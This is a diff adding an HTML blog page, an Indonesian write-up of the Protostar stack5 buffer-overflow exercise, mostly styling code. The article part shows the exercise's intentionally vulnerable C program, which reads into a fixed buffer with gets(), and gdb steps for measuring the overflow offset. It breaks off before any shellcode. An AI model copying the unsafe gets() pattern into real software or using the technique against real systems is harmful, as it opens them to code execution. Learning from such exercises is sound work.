@@ -1,0 +1,871 @@
+<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><style id="typography.js">html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block}audio:not([controls]){display:none;height:0}progress{vertical-align:baseline}[hidden],template{display:none}a{background-color:transparent;-webkit-text-decoration-skip:objects}a:active,a:hover{outline-width:0}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit;font-weight:bolder}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}img{border-style:none}svg:not(:root){overflow:hidden}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}button,input,optgroup,select,textarea{font:inherit;margin:0}optgroup{font-weight:700}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-input-placeholder{color:inherit;opacity:.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}html{font:100%/1.4 'Roboto',sans-serif;box-sizing:border-box;overflow-y:scroll;-webkit-font-smoothing:antialiased;}*{box-sizing:inherit;}*:before{box-sizing:inherit;}*:after{box-sizing:inherit;}body{color:hsla(0,0%,0%,0.87);font-family:'Roboto',sans-serif;font-weight:400;word-wrap:break-word;font-kerning:normal;-moz-font-feature-settings:"kern", "liga", "clig", "calt";-ms-font-feature-settings:"kern", "liga", "clig", "calt";-webkit-font-feature-settings:"kern", "liga", "clig", "calt";font-feature-settings:"kern", "liga", "clig", "calt";letter-spacing:.03em;}img{max-width:100%;margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}h1{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:2rem;line-height:1.1;}h2{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:1.51572rem;line-height:1.1;}h3{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:1.31951rem;line-height:1.1;}h4{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:1rem;line-height:1.1;}h5{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:0.87055rem;line-height:1.1;}h6{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;color:inherit;font-family:'Lato',sans-serif;font-weight:400;text-rendering:optimizeLegibility;font-size:0.81225rem;line-height:1.1;}hgroup{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}ul{margin-left:1.4rem;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;list-style-position:outside;list-style-image:none;}ol{margin-left:1.4rem;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;list-style-position:outside;list-style-image:none;}dl{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}dd{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}p{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}figure{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}pre{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;font-size:0.85rem;line-height:1.4rem;}table{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;font-size:1rem;line-height:1.4rem;border-collapse:collapse;width:100%;}fieldset{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}blockquote{margin-left:-1.4rem;margin-right:1.4rem;margin-top:0;padding-bottom:0;padding-left:1.1375rem;padding-right:0;padding-top:0;margin-bottom:1.4rem;font-size:1.1487rem;line-height:1.4rem;color:hsla(0,0%,0%,0.6);border-left:0.2625rem solid hsla(0,0%,0%,0.87);}form{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}noscript{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}iframe{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}hr{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:calc(1.4rem - 1px);background:hsla(0,0%,0%,0.2);border:none;height:1px;}address{margin-left:0;margin-right:0;margin-top:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;margin-bottom:1.4rem;}b{font-weight:700;}strong{font-weight:700;}dt{font-weight:700;}th{font-weight:700;}li{margin-bottom:calc(1.4rem / 2);}ol li{padding-left:0;}ul li{padding-left:0;}li > ol{margin-left:1.4rem;margin-bottom:calc(1.4rem / 2);margin-top:calc(1.4rem / 2);}li > ul{margin-left:1.4rem;margin-bottom:calc(1.4rem / 2);margin-top:calc(1.4rem / 2);}blockquote *:last-child{margin-bottom:0;}li *:last-child{margin-bottom:0;}p *:last-child{margin-bottom:0;}li > p{margin-bottom:calc(1.4rem / 2);}code{font-size:0.7rem!important;line-height:1!important;}kbd{font-size:0.85rem;line-height:1.4rem;}samp{font-size:0.85rem;line-height:1.4rem;}abbr{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;}acronym{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;}abbr[title]{border-bottom:1px dotted hsla(0,0%,0%,0.5);cursor:help;text-decoration:none;}thead{text-align:left;}td,th{text-align:left;border-bottom:1px solid hsla(0,0%,0%,0.12);font-feature-settings:"tnum";-moz-font-feature-settings:"tnum";-ms-font-feature-settings:"tnum";-webkit-font-feature-settings:"tnum";padding-left:0.93333rem;padding-right:0.93333rem;padding-top:0.7rem;padding-bottom:calc(0.7rem - 1px);}th:first-child,td:first-child{padding-left:0;}th:last-child,td:last-child{padding-right:0;}a{color:inherit;}a:hover{color:#3498DB;}@media only screen and (max-width:480px){blockquote{margin-left:-1.05rem;padding-left:0.7875rem;margin-right:0;}}</style><style data-href="/styles.85333577aa7dbfd7b7d3.css">code[class*=language-],pre[class*=language-]{color:#657b83;font-family:Consolas,Monaco,Andale Mono,Ubuntu Mono,monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-ms-hyphens:none;hyphens:none}code[class*=language-]::selection,code[class*=language-] ::selection,pre[class*=language-]::selection,pre[class*=language-] ::selection{background:#073642}pre[class*=language-]{padding:1em;margin:.5em 0;overflow:auto;border-radius:.3em}:not(pre)>code[class*=language-],pre[class*=language-]{background-color:#fdf6e3}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em}.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#93a1a1}.token.punctuation{color:#586e75}.token.namespace{opacity:.7}.token.boolean,.token.constant,.token.deleted,.token.number,.token.property,.token.symbol,.token.tag{color:#268bd2}.token.attr-name,.token.builtin,.token.char,.token.inserted,.token.selector,.token.string,.token.url{color:#2aa198}.token.entity{color:#657b83;background:#eee8d5}.token.atrule,.token.attr-value,.token.keyword{color:#859900}.token.class-name,.token.function{color:#b58900}.token.important,.token.regex,.token.variable{color:#cb4b16}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}</style><meta name="generator" content="Gatsby 2.23.12"/><title data-react-helmet="true">Protostar: stack5 | Rochim&#x27;s Log</title><meta data-react-helmet="true" name="google-site-verification" content="Mss0Hxe25yLcF_RF5r9RCdZJNLRyMN9PVSGzKd5neb0"/><style type="text/css">svg:not(:root).svg-inline--fa {
+  overflow: visible;
+}
+
+.svg-inline--fa {
+  display: inline-block;
+  font-size: inherit;
+  height: 1em;
+  overflow: visible;
+  vertical-align: -0.125em;
+}
+.svg-inline--fa.fa-lg {
+  vertical-align: -0.225em;
+}
+.svg-inline--fa.fa-w-1 {
+  width: 0.0625em;
+}
+.svg-inline--fa.fa-w-2 {
+  width: 0.125em;
+}
+.svg-inline--fa.fa-w-3 {
+  width: 0.1875em;
+}
+.svg-inline--fa.fa-w-4 {
+  width: 0.25em;
+}
+.svg-inline--fa.fa-w-5 {
+  width: 0.3125em;
+}
+.svg-inline--fa.fa-w-6 {
+  width: 0.375em;
+}
+.svg-inline--fa.fa-w-7 {
+  width: 0.4375em;
+}
+.svg-inline--fa.fa-w-8 {
+  width: 0.5em;
+}
+.svg-inline--fa.fa-w-9 {
+  width: 0.5625em;
+}
+.svg-inline--fa.fa-w-10 {
+  width: 0.625em;
+}
+.svg-inline--fa.fa-w-11 {
+  width: 0.6875em;
+}
+.svg-inline--fa.fa-w-12 {
+  width: 0.75em;
+}
+.svg-inline--fa.fa-w-13 {
+  width: 0.8125em;
+}
+.svg-inline--fa.fa-w-14 {
+  width: 0.875em;
+}
+.svg-inline--fa.fa-w-15 {
+  width: 0.9375em;
+}
+.svg-inline--fa.fa-w-16 {
+  width: 1em;
+}
+.svg-inline--fa.fa-w-17 {
+  width: 1.0625em;
+}
+.svg-inline--fa.fa-w-18 {
+  width: 1.125em;
+}
+.svg-inline--fa.fa-w-19 {
+  width: 1.1875em;
+}
+.svg-inline--fa.fa-w-20 {
+  width: 1.25em;
+}
+.svg-inline--fa.fa-pull-left {
+  margin-right: 0.3em;
+  width: auto;
+}
+.svg-inline--fa.fa-pull-right {
+  margin-left: 0.3em;
+  width: auto;
+}
+.svg-inline--fa.fa-border {
+  height: 1.5em;
+}
+.svg-inline--fa.fa-li {
+  width: 2em;
+}
+.svg-inline--fa.fa-fw {
+  width: 1.25em;
+}
+
+.fa-layers svg.svg-inline--fa {
+  bottom: 0;
+  left: 0;
+  margin: auto;
+  position: absolute;
+  right: 0;
+  top: 0;
+}
+
+.fa-layers {
+  display: inline-block;
+  height: 1em;
+  position: relative;
+  text-align: center;
+  vertical-align: -0.125em;
+  width: 1em;
+}
+.fa-layers svg.svg-inline--fa {
+  -webkit-transform-origin: center center;
+          transform-origin: center center;
+}
+
+.fa-layers-counter, .fa-layers-text {
+  display: inline-block;
+  position: absolute;
+  text-align: center;
+}
+
+.fa-layers-text {
+  left: 50%;
+  top: 50%;
+  -webkit-transform: translate(-50%, -50%);
+          transform: translate(-50%, -50%);
+  -webkit-transform-origin: center center;
+          transform-origin: center center;
+}
+
+.fa-layers-counter {
+  background-color: #ff253a;
+  border-radius: 1em;
+  -webkit-box-sizing: border-box;
+          box-sizing: border-box;
+  color: #fff;
+  height: 1.5em;
+  line-height: 1;
+  max-width: 5em;
+  min-width: 1.5em;
+  overflow: hidden;
+  padding: 0.25em;
+  right: 0;
+  text-overflow: ellipsis;
+  top: 0;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: top right;
+          transform-origin: top right;
+}
+
+.fa-layers-bottom-right {
+  bottom: 0;
+  right: 0;
+  top: auto;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: bottom right;
+          transform-origin: bottom right;
+}
+
+.fa-layers-bottom-left {
+  bottom: 0;
+  left: 0;
+  right: auto;
+  top: auto;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: bottom left;
+          transform-origin: bottom left;
+}
+
+.fa-layers-top-right {
+  right: 0;
+  top: 0;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: top right;
+          transform-origin: top right;
+}
+
+.fa-layers-top-left {
+  left: 0;
+  right: auto;
+  top: 0;
+  -webkit-transform: scale(0.25);
+          transform: scale(0.25);
+  -webkit-transform-origin: top left;
+          transform-origin: top left;
+}
+
+.fa-lg {
+  font-size: 1.3333333333em;
+  line-height: 0.75em;
+  vertical-align: -0.0667em;
+}
+
+.fa-xs {
+  font-size: 0.75em;
+}
+
+.fa-sm {
+  font-size: 0.875em;
+}
+
+.fa-1x {
+  font-size: 1em;
+}
+
+.fa-2x {
+  font-size: 2em;
+}
+
+.fa-3x {
+  font-size: 3em;
+}
+
+.fa-4x {
+  font-size: 4em;
+}
+
+.fa-5x {
+  font-size: 5em;
+}
+
+.fa-6x {
+  font-size: 6em;
+}
+
+.fa-7x {
+  font-size: 7em;
+}
+
+.fa-8x {
+  font-size: 8em;
+}
+
+.fa-9x {
+  font-size: 9em;
+}
+
+.fa-10x {
+  font-size: 10em;
+}
+
+.fa-fw {
+  text-align: center;
+  width: 1.25em;
+}
+
+.fa-ul {
+  list-style-type: none;
+  margin-left: 2.5em;
+  padding-left: 0;
+}
+.fa-ul > li {
+  position: relative;
+}
+
+.fa-li {
+  left: -2em;
+  position: absolute;
+  text-align: center;
+  width: 2em;
+  line-height: inherit;
+}
+
+.fa-border {
+  border: solid 0.08em #eee;
+  border-radius: 0.1em;
+  padding: 0.2em 0.25em 0.15em;
+}
+
+.fa-pull-left {
+  float: left;
+}
+
+.fa-pull-right {
+  float: right;
+}
+
+.fa.fa-pull-left,
+.fas.fa-pull-left,
+.far.fa-pull-left,
+.fal.fa-pull-left,
+.fab.fa-pull-left {
+  margin-right: 0.3em;
+}
+.fa.fa-pull-right,
+.fas.fa-pull-right,
+.far.fa-pull-right,
+.fal.fa-pull-right,
+.fab.fa-pull-right {
+  margin-left: 0.3em;
+}
+
+.fa-spin {
+  -webkit-animation: fa-spin 2s infinite linear;
+          animation: fa-spin 2s infinite linear;
+}
+
+.fa-pulse {
+  -webkit-animation: fa-spin 1s infinite steps(8);
+          animation: fa-spin 1s infinite steps(8);
+}
+
+@-webkit-keyframes fa-spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg);
+  }
+}
+
+@keyframes fa-spin {
+  0% {
+    -webkit-transform: rotate(0deg);
+            transform: rotate(0deg);
+  }
+  100% {
+    -webkit-transform: rotate(360deg);
+            transform: rotate(360deg);
+  }
+}
+.fa-rotate-90 {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
+  -webkit-transform: rotate(90deg);
+          transform: rotate(90deg);
+}
+
+.fa-rotate-180 {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
+  -webkit-transform: rotate(180deg);
+          transform: rotate(180deg);
+}
+
+.fa-rotate-270 {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
+  -webkit-transform: rotate(270deg);
+          transform: rotate(270deg);
+}
+
+.fa-flip-horizontal {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
+  -webkit-transform: scale(-1, 1);
+          transform: scale(-1, 1);
+}
+
+.fa-flip-vertical {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
+  -webkit-transform: scale(1, -1);
+          transform: scale(1, -1);
+}
+
+.fa-flip-both, .fa-flip-horizontal.fa-flip-vertical {
+  -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
+  -webkit-transform: scale(-1, -1);
+          transform: scale(-1, -1);
+}
+
+:root .fa-rotate-90,
+:root .fa-rotate-180,
+:root .fa-rotate-270,
+:root .fa-flip-horizontal,
+:root .fa-flip-vertical,
+:root .fa-flip-both {
+  -webkit-filter: none;
+          filter: none;
+}
+
+.fa-stack {
+  display: inline-block;
+  height: 2em;
+  position: relative;
+  width: 2.5em;
+}
+
+.fa-stack-1x,
+.fa-stack-2x {
+  bottom: 0;
+  left: 0;
+  margin: auto;
+  position: absolute;
+  right: 0;
+  top: 0;
+}
+
+.svg-inline--fa.fa-stack-1x {
+  height: 1em;
+  width: 1.25em;
+}
+.svg-inline--fa.fa-stack-2x {
+  height: 2em;
+  width: 2.5em;
+}
+
+.fa-inverse {
+  color: #fff;
+}
+
+.sr-only {
+  border: 0;
+  clip: rect(0, 0, 0, 0);
+  height: 1px;
+  margin: -1px;
+  overflow: hidden;
+  padding: 0;
+  position: absolute;
+  width: 1px;
+}
+
+.sr-only-focusable:active, .sr-only-focusable:focus {
+  clip: auto;
+  height: auto;
+  margin: 0;
+  overflow: visible;
+  position: static;
+  width: auto;
+}
+
+.svg-inline--fa .fa-primary {
+  fill: var(--fa-primary-color, currentColor);
+  opacity: 1;
+  opacity: var(--fa-primary-opacity, 1);
+}
+
+.svg-inline--fa .fa-secondary {
+  fill: var(--fa-secondary-color, currentColor);
+  opacity: 0.4;
+  opacity: var(--fa-secondary-opacity, 0.4);
+}
+
+.svg-inline--fa.fa-swap-opacity .fa-primary {
+  opacity: 0.4;
+  opacity: var(--fa-secondary-opacity, 0.4);
+}
+
+.svg-inline--fa.fa-swap-opacity .fa-secondary {
+  opacity: 1;
+  opacity: var(--fa-primary-opacity, 1);
+}
+
+.svg-inline--fa mask .fa-primary,
+.svg-inline--fa mask .fa-secondary {
+  fill: black;
+}
+
+.fad.fa-inverse {
+  color: #fff;
+}</style><link href="//fonts.googleapis.com/css?family=Roboto:400,400i|Lato:400,700" rel="stylesheet" type="text/css"/><link as="script" rel="preload" href="/webpack-runtime-291198205a3604934848.js"/><link as="script" rel="preload" href="/framework-8dcecaaefd71e2213eb2.js"/><link as="script" rel="preload" href="/styles-fa79fef4936efa84b233.js"/><link as="script" rel="preload" href="/app-0842d1f2308dcbc38b7d.js"/><link as="script" rel="preload" href="/a9a7754c-a89164b92346a482070c.js"/><link as="script" rel="preload" href="/commons-28905493922b46291e52.js"/><link as="script" rel="preload" href="/component---src-templates-blog-post-js-0314926304c56436cd57.js"/><link as="fetch" rel="preload" href="/page-data/belajar-reversing-protostar-stack5/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><div id="___gatsby"><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><style data-emotion-css="my6y82">.css-my6y82{margin:0 auto;max-width:800px;padding:2.1rem;padding-top:2.1rem;}</style><div class="css-my6y82"><nav style="display:flex;justify-content:space-between"><a href="/"><h2 style="display:inline-block">Rochim&#x27;s Log</h2></a><div><a style="text-decoration:none;float:right;margin-right:10px" href="/about/">About</a><a style="text-decoration:none;float:right;margin-right:10px" href="/contact/">Contact</a><a style="text-decoration:none;float:right;margin-right:10px" href="/blog/">Blog</a></div></nav><hr/><div><h1>Protostar: stack5</h1><div><p>Melanjutkan ke stack5. Berdasarkan <a href="https://exploit-exercises.lains.space/protostar/stack5/">halaman resmi</a> dari <a href="https://exploit-exercises.lains.space/protostar/stack5/">stack5</a>, challenge kali ini kita akan diperkenalkan dengan <strong>shellcode</strong>. Berdasarkan <a href="https://en.wikipedia.org/wiki/Shellcode">wikipedia</a>, shellcode adalah sepotong kecil kode yang digunakan sebagai <em>payload</em> dalam eksploitasi kerentanan perangkat lunak. Untuk lebih mengerti dan mengetahui mengenai shellcode saya rekomendasikan untuk membaca artikel yang sangat bagus dari Pak Yohanes <a href="https://yohan.es/security/buffer-overflow/shellcode/">disini</a>.</p>
+<p>Berkas stack5 dapat ditemukan pada directory <code class="language-text">/opt/protostar/bin</code>. Kita cek terlebih dahulu dengan utilitas <code class="language-text">file</code>.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">file</span> stack5</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 760px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/a616292f3518fd25e0192fd75086a54f/3c051/protostar-stack5-1.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 11.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAj0lEQVQI1x2N2w6CMBBEeVFUFI2CQY0xIRp9844pSGkhheIF//9rxqUPm7kke8baFC+E5Rehehvd6Yb8B9uqQcAV9vUPXlJgyiSca4rhjWP8ELBPMdxIYEK+d04wY7npLTfKME8V1lJjkVXw6TngJZZCw4tzk1eyxoHAoztHl0ADAneODP3L05xNwHaoHfwDBMs+rVw2rHoAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="output file stack5"
+        title="output file stack5"
+        src="/static/a616292f3518fd25e0192fd75086a54f/3c051/protostar-stack5-1.png"
+        srcset="/static/a616292f3518fd25e0192fd75086a54f/772e8/protostar-stack5-1.png 200w,
+/static/a616292f3518fd25e0192fd75086a54f/e17e5/protostar-stack5-1.png 400w,
+/static/a616292f3518fd25e0192fd75086a54f/3c051/protostar-stack5-1.png 760w"
+        sizes="(max-width: 760px) 100vw, 760px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Sama seperti yang sebelumnya, sekarang mari kita lihat source codenya.</p>
+<div class="gatsby-highlight" data-language="c"><pre class="language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre></div>
+<p>Sangat singkat sekali! Sekarang mari kita cari ukuran buffer dan paddingnya dengan cara yang sama dengan saat kita mencari di <a href="/belajar-reversing-protostar-stack4">stack4</a>.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">gdb -q stack5
+<span class="token builtin class-name">set</span> disassembly-flavor intel
+disas main
+b* 0x080483d4
+r
+ni</code></pre></div>
+<p>Pada baris pertama kita malakukan load stack5 ke gdb dengan mode quiet. Baris kedua mengatur syntax disassembly ke mode intel. Baris ketiga melakukan disassembly pada fungsi main. Baris keempat memasang breakpoint pada alamat 0x080483d4, saat pemanggilan fungsi gets (b merupakan singkatan dari break). Baris selanjutnya kita menjalankan stack5 (r merupakan singkatan dari run). Saat breakpoint tercapai, kita gunakan ni untuk melakukan next into, program akan meminta input. Seperti sebelumnya kita akan menggunakan bantuan dari <a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html">halaman ini</a>. Kita akan mengenerate 100 karakter saja.</p>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 762px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/722efd39e216aecf901818ef1edc76c6/a016c/protostar-stack5-2.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 77.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACnElEQVQ4y51T605TQRg8RYRSKAUKSAioQAu0tLb0fqU3eqMtFMRX8AWMMdE/osFoQFFUMIJIIhqeyvAEoBFimqjj933tQUkUjCeZ7J69zM43s6t83NvD5/19fPl0gK+Hh6gcHeFbpYL/+n58h7L8ZhtLG1tYWF3D4voGnr37gBfvd/F8Z1faJ9s7ePD6Le6tb2JhbRP3X23hztM13Fpexd2XG7j5eAXXlxZxe2UdNx4+gtLui6I7kkJHIA69J4IWd1j6Bm8Ubf4YdK4QGp1B1Nt9UEbHoZgdUIadUEZc1b7FA43FWx2zeqBcSk7BnJvBYLqI/kQelycLGM6X5d+UncbFZB4D1B/KlNAeSOC8I4QG5y80OsMn/hUTLewjogEi4s09E2n0RDPSGkMp6Nyk2jtR20wbrN7TYcoU0RvLirK+eBatvhhavTFRY/DHoR0PU6luKs1bxZjvdNiKcxgjMOkQkbOiznCK/IvLIW3kp5RyFpEKe+kqbKU58c+cm0aTK4KOYALN7ihGpspyiDGYRJ3NXy3pLELH9Dwc5WvVMIjQQCWzQiaxFGZpfErm+hO5fyO1kAprcVZSZELVuyZXGBqbT3DOHqB0g3JFjgn/Rswl9VO6pmxJSmQlvJnB3nEojYT6KwHyNyrtH8nUscF0ga5JGnpKtsUzIQpFJZXOSlU/NbRYVEpZnpP4XbWRNhhDSUm1nXzrqiXMpDzOLR/G14nvI5Oz6hZPFM0EDrFBvZ9Mykq0NNgby4j5DA6EN7QRGRMxaSddcm2t9Dq7Hw01W/hfw2Gpavl1dEcmpTxVlUqkJ0WsgFXpBNVXw8qYXEvB8TzPccuWKc6ZeYxSGKzsAnlpqCli77rCk8dvXF5TqiBtXzwn4ABZkDrH634CKLYpf086WmwAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="output runtutan perintah diatas"
+        title="output runtutan perintah diatas"
+        src="/static/722efd39e216aecf901818ef1edc76c6/a016c/protostar-stack5-2.png"
+        srcset="/static/722efd39e216aecf901818ef1edc76c6/772e8/protostar-stack5-2.png 200w,
+/static/722efd39e216aecf901818ef1edc76c6/e17e5/protostar-stack5-2.png 400w,
+/static/722efd39e216aecf901818ef1edc76c6/a016c/protostar-stack5-2.png 762w"
+        sizes="(max-width: 762px) 100vw, 762px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Sekarang mari kita cari ukuran buffer+paddingnya.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">info frame
+x/s 0xbffff7bc</code></pre></div>
+<p>Perintah <code class="language-text">info frame</code> akan menunjukkan alamat dari eip. Perintah selanjutnya untuk men examine dalam string isi dari <strong>0xbffff7bc</strong>.</p>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 762px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/e9ef894c38b7b47fe1a5990fa7083515/a016c/protostar-stack5-3.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
